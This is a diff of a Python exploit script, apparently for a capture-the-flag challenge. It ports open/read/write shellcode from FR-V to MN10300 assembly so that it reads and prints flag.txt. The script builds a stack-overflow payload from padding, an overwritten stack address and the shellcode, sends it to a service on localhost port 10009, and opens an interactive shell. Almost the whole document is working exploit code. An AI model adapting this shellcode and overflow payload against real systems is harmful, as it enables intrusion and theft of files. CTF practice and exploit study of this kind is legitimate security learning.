@@ -3,35 +3,45 @@ asm = '''.section .text
 
 .ascii "%s"
 _start:
-    xor gr20, gr20, gr20
-    bra get_addr
-ret:
-    movsg lr, gr19
-open:
-    mov gr19, gr8
-    mov gr20, gr9
-    mov gr20, gr10
-    setlos 0x2,gr7
-    tira gr0,0
-read:
-    mov gr19, gr9
-    setlo 0x7f,gr10
-    setlos 0x4,gr7
-    tira gr0,0
-write:
-    setlo 0x1, gr8
-    mov gr19, gr9
-    setlo 0x7f,gr10
-    setlos 0x5,gr7
-    tira gr0,0
+  nop
+  nop
+
+  # call get_addr
+  .word 0xfffa
+  .word 0x0004
 get_addr:
-    call ret
+  mov (0, sp), d2
+  # len(shellcode) - 4
+  add 39, d2
+open:
+  mov d2, d1
+  clr d0
+  mov d0, (12, sp)
+  mov d0, (16, sp)
+  mov 2, d0
+  syscall
+read:
+  mov d0, d1
+  mov a0, (12, sp)
+  clr d0
+  add 0x7f, d0
+  mov d0, (16, sp)
+  mov 4, d0
+  syscall
+write:
+  mov 1, d1
+  mov a0, (12, sp)
+  clr d0
+  add 0x7f, d0
+  mov d0, (16, sp)
+  mov 5, d0
+  syscall
 .ascii "%s"
-  '''
+'''
 import os
 from lib.mylib import *
 
-ARCH = 'frv'
+ARCH = 'mn10300'
 AS = ARCH + '-elf-as'
 OBJDUMP = ARCH + '-elf-objdump'
 FLAG = 'flag.txt'
@@ -49,10 +59,10 @@ shellcode = shellcode + FLAG + '\x00'
 xxd(shellcode)
 
 IP = '127.0.0.1'
-PORT = 10006
+PORT = 10009
 s = mysock(IP, PORT)
-s.send('\n000')
-SP = 0x1afc
-shellcode = 'AAAAAAAAAAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
+sl(s, '\n000')
+SP = 0x1b08
+shellcode = 'AAAAAAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
 sl(s, shellcode)
 shell(s)
